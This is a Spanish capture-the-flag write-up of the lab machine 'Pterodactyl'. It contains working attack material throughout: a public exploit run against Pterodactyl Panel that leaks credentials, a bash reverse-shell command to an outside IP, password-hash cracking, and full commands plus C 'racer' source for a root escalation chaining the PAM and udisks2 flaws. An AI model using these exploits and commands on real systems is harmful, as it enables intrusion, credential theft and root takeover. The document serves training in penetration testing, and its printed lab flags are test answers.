
# Pterodactyl

<figure><img src="/files/YIoJPpzpswZGugMwrOi9" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Información General</mark>

* **Nombre de la máquina:** `Pterodactyl`
* **IP:** `10.129.66.182`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `16/05/2026`

***

## <mark style="color:$primary;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.129.66.182 pterodactyl.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

```bash
sudo nmap -v -sV -T5 10.129.66.182
```

```bash
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
80/tcp   open   http       nginx 1.21.5
443/tcp  closed https
8080/tcp closed http-proxy
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://pterodactyl.htb` y observamos que parece ser un servidor Minecraft y encontramos un subdominio: `play.pterodactyl.htb`

<figure><img src="/files/U2Z7KpI9MF4TCgAeEykh" alt=""><figcaption></figcaption></figure>

Lo añadimos a `/etc/hosts` y accedemos, pero nos vuelve a redirigir al dominio principal. Podría haber otros subdominios.

En `http://pterodactyl.htb/changelog.txt` encontramos un changelog con la versión:

{% code overflow="wrap" %}

```
MonitorLand - CHANGELOG.txt
======================================

Version 1.20.X

[Added] Main Website Deployment
--------------------------------
- Deployed the primary landing site for MonitorLand.
- Implemented homepage, and link for Minecraft server.
- Integrated site styling and dark-mode as primary.

[Linked] Subdomain Configuration
--------------------------------
- Added DNS and reverse proxy routing for play.pterodactyl.htb.
- Configured NGINX virtual host for subdomain forwarding.

[Installed] Pterodactyl Panel v1.11.10
--------------------------------------
- Installed Pterodactyl Panel.
- Configured environment:
  - PHP with required extensions.
  - MariaDB 11.8.3 backend.

[Enhanced] PHP Capabilities
-------------------------------------
- Enabled PHP-FPM for smoother website handling on all domains.
- Enabled PHP-PEAR for PHP package management.
- Added temporary PHP debugging via phpinfo()
```

{% endcode %}

Encontramos `Pterodactyl Panel v1.11.10`, lo que nos permitirís buscar exploits públicos para explotarlo. También tiene una base de datos asociada `MariaDB 11.8.3`.

***

## <mark style="color:$primary;">Enumeración de Subdominios (VHosts)</mark>

#### Comprobación de Content-Length

```bash
curl -s -I http://10.129.66.182 -H "Host: defnotvalid.pterodactyl.htb" | grep "Content-Length:"

Content-Length: 145
```

#### Fuzzing con FFUF

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.129.66.182/ -H 'Host: FUZZ.pterodactyl.htb' -fs 145

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.66.182/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.pterodactyl.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 145
________________________________________________

panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 340ms]
```

**Encontramos otro subdominio:** `panel.pterodactyl.htb`

Lo añadimos a `/etc/hosts` y accedemos a un panel de login, pero no tenemos ni usuario ni contraseña:

<figure><img src="/files/YpNBZ4yTRjPsIHXp0wCt" alt=""><figcaption></figcaption></figure>

Podríamos probar fuerza bruta pero antes vamos a buscar exploits.

***

## <mark style="color:$primary;">Explotación</mark>

Encontramos el siguiente exploit que nos permite conseguir RCE mediante un unauthenticated LFI en `Pterodactyl Panel v1.11.10`:

{% embed url="<https://github.com/YoyoChaud/CVE-2025-49132>" %}

{% code overflow="wrap" %}

```bash
git clone https://github.com/YoyoChaud/CVE-2025-49132
cd CVE-2025-49132
```

{% endcode %}

{% code overflow="wrap" %}

```bash
python3 exploit.py http://panel.pterodactyl.htb

  ___ __   __ ___      ___   ___  ___  ___        _  _   ___  _  ____  ___ 
 / __|\ \ / /| __|___ |_  ) / _ \|_  )| __|___   | || | / _ \| ||__ / |_  )
| (__  \ V / | _|___|  / / | (_) |/ / |__ \___|  |_  _| \_, /| ||_ \  / / 
 \___|  \_/  |___|    /___| \___//___||___/        |_|   /_/ |_|___/ /___|

  Pterodactyl Panel - Unauthenticated Exploit
  Targets: <= 1.11.10 | Patched: 1.11.11
  Exploit By YoyoChaud

════════════════════════════════════════════════════════════
  VULNERABILITY CHECK
════════════════════════════════════════════════════════════
  [*] Target: http://panel.pterodactyl.htb
  [+] Endpoint accessible without hash parameter
  [+] TARGET IS VULNERABLE

════════════════════════════════════════════════════════════
  DATABASE CREDENTIALS
════════════════════════════════════════════════════════════
  [+] MySQL credentials extracted
      host: 127.0.0.1
      port: 3306
      database: panel
      username: pterodactyl
      password: PteraPanel
      Connection string: pterodactyl:PteraPanel@127.0.0.1:3306/panel

  [+] Redis configuration
      host: 127.0.0.1
      port: 6379
      password: (none)
      database: 0
      
════════════════════════════════════════════════════════════
  APPLICATION CONFIG
════════════════════════════════════════════════════════════
  [+] Application details extracted
      name: Pterodactyl
      version: 1.11.10
      environment: production
      debug: (empty)
      url: http://panel.pterodactyl.htb
      timezone: UTC
      cipher: AES-256-CBC
      APP_KEY: base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=

      ⚠  APP_KEY → Laravel deserialization RCE (CVE-2018-15133)
      
<----SNIP---->
```

{% endcode %}

Obtenemos las credenciales de la base de datos y el comando de conexión cuando hayamos accedido al servidor:

{% code overflow="wrap" %}

```bash
username: pterodactyl
password: PteraPanel

pterodactyl:PteraPanel@127.0.0.1:3306/panel
```

{% endcode %}

Y también obtenemos el APP\_KEY para explotar un `Laravel deserialization RCE (CVE-2018-15133)`

***

## <mark style="color:$primary;">Acceso Inicial</mark>

### RCE

Abrimos un listenr por el puerto 4444 (yo  usaré Penelope)

{% code overflow="wrap" %}

```
penelope
```

{% endcode %}

Y ejecutamos el exploit:

{% code overflow="wrap" %}

```bash
python3 exploit.py http://panel.pterodactyl.htb \
--rce-cmd "bash -c 'bash -i >& /dev/tcp/10.10.14.41/4444 0>&1'" \
--pear-dir /usr/share/php/PEAR
```

{% endcode %}

<figure><img src="/files/bub8rTzmC43S3NyIIfDE" alt=""><figcaption></figcaption></figure>

Estamos dentro! Tenemos una shell como el usuario `wwwrun`

***

## <mark style="color:$primary;">User Flag</mark>

En la home podemos acceder al directorio de `phileasfogg3` donde se encuentra la user flag:

```bash
wwwrun@pterodactyl:/var/www/pterodactyl/public> cd /home
wwwrun@pterodactyl:/home> ls
headmonitor  phileasfogg3
wwwrun@pterodactyl:/home> cd headmonitor/
bash: cd: headmonitor/: Permission denied
wwwrun@pterodactyl:/home> cd phileasfogg3/
wwwrun@pterodactyl:/home/phileasfogg3> ls
bin  user.txt
wwwrun@pterodactyl:/home/phileasfogg3> cat user.txt 
d9cd6ec77f11e4315a1a02ba58b3d642
```

Pero no tenemos permiso para acceder a `headmonitor`, tendremos que elevar privilegios.

***

## <mark style="color:$primary;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos sudo como el usuario `wwwrun`:

```bash
wwwrun@pterodactyl:/home/phileasfogg3> sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

[sudo] password for wwwrun: 
```

### Conexión a base de datos

Antes encontramos credenciales para acceder a la base de datos, que enumeraremos para obtener más información:

```bash
username: pterodactyl
password: PteraPanel
```

{% code overflow="wrap" %}

```sql
wwwrun@pterodactyl:~> mysql -h panel.pterodactyl.htb -u pterodactyl -p'PteraPanel' 

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 166
Server version: 11.8.3-MariaDB MariaDB package

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| panel              |
| test               |
+--------------------+
3 rows in set (0.001 sec)

MariaDB [(none)]> 
```

{% endcode %}

### Enumeración de base de datos

```sql
MariaDB [(none)]> use panel;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [panel]> show tables;
+-----------------------+
| Tables_in_panel       |
+-----------------------+
| activity_log_subjects |
| activity_logs         |
| allocations           |
| api_keys              |
| api_logs              |
| audit_logs            |
| backups               |
| database_hosts        |
| databases             |
| egg_mount             |
| egg_variables         |
| eggs                  |
| failed_jobs           |
| jobs                  |
| locations             |
| migrations            |
| mount_node            |
| mount_server          |
| mounts                |
| nests                 |
| nodes                 |
| notifications         |
| password_resets       |
| recovery_tokens       |
| schedules             |
| server_transfers      |
| server_variables      |
| servers               |
| sessions              |
| settings              |
| subusers              |
| tasks                 |
| tasks_log             |
| user_ssh_keys         |
| users                 |
+-----------------------+
35 rows in set (0.001 sec)

MariaDB [panel]> select * from users;
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
| id | external_id | uuid                                 | username     | email                        | name_first | name_last | password                                                     | remember_token                                               | language | root_admin | use_totp | totp_secret | totp_authenticated_at | gravatar | created_at          | updated_at          |
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
|  2 | NULL        | 5e6d956e-7be9-41ec-8016-45e434de8420 | headmonitor  | headmonitor@pterodactyl.htb  | Head       | Monitor   | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 | OL0dNy1nehBYdx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU | en       |          1 |        0 | NULL        | NULL                  |        1 | 2025-09-16 17:15:41 | 2025-09-16 17:15:41 |
|  3 | NULL        | ac7ba5c2-6fd8-4600-aeb6-f15a3906982b | phileasfogg3 | phileasfogg3@pterodactyl.htb | Phileas    | Fogg      | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi | 6XGbHcVLLV9fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8 | en       |          0 |        0 | NULL        | NULL                  |        1 | 2025-09-16 19:44:19 | 2025-11-07 18:28:50 |
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
2 rows in set (0.000 sec)
```

Encontramos tablas interesantes de usuarios donde contienen los hashes de los 2 usuarios internos.

```sql
MariaDB [panel]> select * from user_ssh_keys;
Empty set (0.001 sec)
```

Y la tabla user\_ssh\_keys no contiene nada. Encontramos una API key que podríamos usar para explotación avanzada:

```bash
MariaDB [panel]> select * from api_keys;
+----+---------+----------+------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+----------------------------------------------+--------------+------------+---------------------+---------------------+-----------+---------+---------------+---------+-------------+---------+--------+------------------+--------------------+
| id | user_id | key_type | identifier       | token                                                                                                                                                                                                                                                            | allowed_ips | memo                                         | last_used_at | expires_at | created_at          | updated_at          | r_servers | r_nodes | r_allocations | r_users | r_locations | r_nests | r_eggs | r_database_hosts | r_server_databases |
+----+---------+----------+------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+----------------------------------------------+--------------+------------+---------------------+---------------------+-----------+---------+---------------+---------+-------------+---------+--------+------------------+--------------------+
|  1 |       2 |        2 | ptla_tA4XuTcamhI | eyJpdiI6InByYWw2aDdQOGJ3dWpTMjRaTFFxeHc9PSIsInZhbHVlIjoiQ21zd0RVQzkzOEhuSmNYUUplUWJFNHp6UzBickFhUk9Va0NyVDN1YUVEZnY2TWdQSTE4bXhrdkxtWDJjNk00ayIsIm1hYyI6Ijc5NTIyYzM2Y2FiZDJmNjZjNTQyOGI5ZmFiYTJiMDhkZjEyZjAxNWRkOTEyMjZiZTBhOTVhNDUwN2U4YTRhNmQiLCJ0YWciOiIifQ== | []          | Automatically generated node deployment key. | NULL         | NULL       | 2025-09-16 20:04:30 | 2025-09-16 20:04:30 |         0 |       1 |             0 |       0 |           0 |       0 |      0 |                0 |                  0 |
+----+---------+----------+------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+----------------------------------------------+--------------+------------+---------------------+---------------------+-----------+---------+---------------+---------+-------------+---------+--------+------------------+--------------------+
1 row in set (0.001 sec)
```

### Cracking de hashes

Probamos a crackear el hash de `headmonitor`. pero al ser bcrypt es muy dificil de crackear y no lo conseguimos. Pero si conseguimos crackear el de `phileasfogg`:

```bash
echo '$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi' > phileas_hash
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt phileas_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZ2wsx         (?)
```

### Acceso como phileasfogg3

```bash
wwwrun@pterodactyl:/home> su phileasfogg3
Password: 
phileasfogg3@pterodactyl:/home> whoami
phileasfogg3
```

### Privilegios

El usuario phileas puede ejecutar cualquier comando como root, pero al cambiar al usuario root nos pide la contraseña:

```bash
phileasfogg3@pterodactyl:/home> sudo -l

[sudo] password for phileasfogg3: 
Matching Defaults entries for phileasfogg3 on pterodactyl:
    always_set_home, env_reset, env_keep="LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS
    XDG_SESSION_COOKIE", !insults, secure_path=/usr/sbin\:/usr/bin\:/sbin\:/bin, targetpw

User phileasfogg3 may run the following commands on pterodactyl:
    (ALL) ALL
    
phileasfogg3@pterodactyl:/home> sudo su
[sudo] password for root: 
```

### CVE-2025-6018 + CVE-2025-6019

#### Contexto

* El usuario `phileasfogg3` puede ejecutar cualquier comando como root según `sudo -l`, pero la opción `targetpw` obliga a introducir la **contraseña de root** (que no tenemos).
* La máquina tiene el servicio `udisksd` y un correo advirtiendo de actividad anómala → pista para explotar dos vulnerabilidades encadenadas.

***

#### Paso 1 - CVE-2025-6018: Inyección de variables de entorno vía PAM

**¿Qué hace?**

La vulnerabilidad en `pam_env.so` (presente en openSUSE) permite que un usuario remoto SSH inyecte variables de entorno mediante el archivo `~/.pam_environment`. Estableciendo `XDG_SEAT=seat0` y `XDG_VTNR=1` se engaña a Polkit haciéndole creer que nuestra sesión SSH es una **sesión de consola local activa** (`allow_active`). Así conseguimos permisos para realizar operaciones de hardware (como montar dispositivos) sin necesidad de autenticación adicional.

**Comandos:**

```bash
# 1. Crear el archivo .pam_environment en el home del usuario
echo -e "XDG_SEAT=seat0\nXDG_VTNR=1" > ~/.pam_environment

# 2. Salir de la sesión SSH y volver a entrar (para que PAM recargue las variables)
exit
ssh phileasfogg3@pterodactyl.htb

# 3. Verificar que las variables se han cargado correctamente
echo $XDG_SEAT   # Debe mostrar "seat0"
echo $XDG_VTNR   # Debe mostrar "1"
```

**Explicación:**

Al reconectar, PAM lee `~/.pam_environment` y establece esas variables en el entorno de la sesión. Polkit las interpretará y nos otorgará el estado `allow_active`, necesario para el siguiente paso.

***

#### Paso 2 — CVE-2025-6019: Race condition en udisks2 al redimensionar una imagen XFS

**¿Qué hace?**

`udisks2` (a través de libblockdev) monta temporalmente una imagen XFS sin la opción `nosuid` durante una operación de redimensionado. Aprovechando una carrera (race condition), podemos ejecutar un binario SUID que se encuentre dentro de esa imagen antes de que el sistema lo desmonte. Ese binario se ejecutará como **root**, dándonos una shell privilegiada.

**Requisitos previos:**

* Tener `allow_active` (conseguido en el Paso 1).
* Poder subir archivos a la máquina víctima (ya tenemos SSH).
* La máquina víctima debe tener soporte XFS (en nuestro caso, `mkfs.xfs` está en `/sbin`).

**2.1 Crear la imagen XFS en la máquina víctima**

```bash
# Nos conectamos como phileasfogg3
ssh phileasfogg3@pterodactyl.htb

# Creamos una imagen vacía de 300 MB
dd if=/dev/zero of=/tmp/xfs_new.img bs=1M count=300

# Formateamos la imagen como XFS
/sbin/mkfs.xfs -f /tmp/xfs_new.img
```

**2.2 Transferir la imagen a nuestra máquina atacante, inyectar un binario SUID y devolverla**

**En la máquina atacante:**

```bash
# Copiamos la imagen desde la víctima
scp phileasfogg3@pterodactyl.htb:/tmp/xfs_new.img /tmp/xfs_new.img

# Montamos la imagen localmente (requiere root)
sudo mkdir -p /tmp/mnt
sudo mount -o loop,suid /tmp/xfs_new.img /tmp/mnt

# Creamos un binario que nos dará una shell root (por ejemplo, una copia de bash con SUID)
sudo cp /bin/bash /tmp/mnt/xpl
sudo chmod 4755 /tmp/mnt/xpl   # Permisos: -rwsr-xr-x

# Desmontamos
sudo umount /tmp/mnt

# Comprimimos la imagen para transferirla rápidamente
gzip -c /tmp/xfs_new.img > /tmp/xfs_new.img.gz
```

**Transferimos la imagen modificada de vuelta a la víctima:**

```bash
scp /tmp/xfs_new.img.gz phileasfogg3@pterodactyl.htb:/tmp/
```

**2.3 Compilar un programa “racer” que detecte el montaje temporal y ejecute nuestro SUID**

**En la máquina atacante:**

Crea el archivo `racer.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>

int main() {
    char path[512], cmd[512];
    struct stat st;
    while(1) {
        DIR *d = opendir("/tmp");
        struct dirent *e;
        while((e = readdir(d))) {
            if(strncmp(e->d_name, "blockdev.", 9) == 0) {
                snprintf(path, sizeof(path), "/tmp/%s/xpl", e->d_name);
                if(stat(path, &st) == 0 && (st.st_mode & S_ISUID)) {
                    closedir(d);
                    snprintf(cmd, sizeof(cmd), "%s -p -c 'cp /bin/bash /tmp/b; chmod 4755 /tmp/b'", path);
                    system(cmd);
                    return 0;
                }
            }
        }
        closedir(d);
    }
}
```

Compílalo:

```bash
gcc -O2 -o racer racer.c
```

Sube el binario `racer` a la víctima:

```bash
scp racer phileasfogg3@pterodactyl.htb:/tmp/
```

**2.4 Ejecutar el ataque de carrera (race condition)**

**En la máquina víctima (`phileasfogg3`):**

{% code overflow="wrap" %}

```bash
cd /tmp

# Descomprimir la imagen modificada
gunzip xfs_new.img.gz

# Configurar el dispositivo loop (sin interacción)
udisksctl loop-setup -f /tmp/xfs_new.img --no-user-interaction
# Anota el dispositivo loop que aparece, por ejemplo /dev/loop7 o /dev/loop0

# Limpiar residuos de carreras anteriores
rm -rf /tmp/blockdev.* 2>/dev/null

# Lanzar el racer en segundo plano
/tmp/racer &

# Disparar muchas llamadas D-Bus para redimensionar la imagen
# (usa el loop correcto, ej. loop0)
for i in $(seq 1 300); do gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/loop0 --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}' 2>/dev/null & done; wait
```

{% endcode %}

**Explicación del bucle:**

Enviamos 300 solicitudes de redimensionamiento al sistema D-Bus de `udisks2`. Cada vez que se redimensiona, la imagen se monta temporalmente (sin `nosuid`). El programa `racer` está constantemente buscando en `/tmp/blockdev.*` la presencia del directorio de montaje y el binario `xpl`. En el momento justo en que lo encuentra, lo ejecuta con privilegios root, copiando `/bin/bash` a `/tmp/b` y dándole SUID. Luego ejecutamos `/tmp/b -p` para obtener una shell root.

**2.5 Obtener la shell root**

Cuando el racer tenga éxito, se creará `/tmp/b` con SUID. Ejecútalo:

```bash
phileasfogg3@pterodactyl:/tmp> /tmp/b -p
b-4.4# whoami
root
```

***

## <mark style="color:$primary;">👑</mark> <mark style="color:$primary;">Root Flag</mark>

```bash
b-4.4# cd /root
b-4.4# ls
bin  inst-sys  root.txt
b-4.4# cat root.txt 
a350f5522e40aea4ed8fdc40********
```
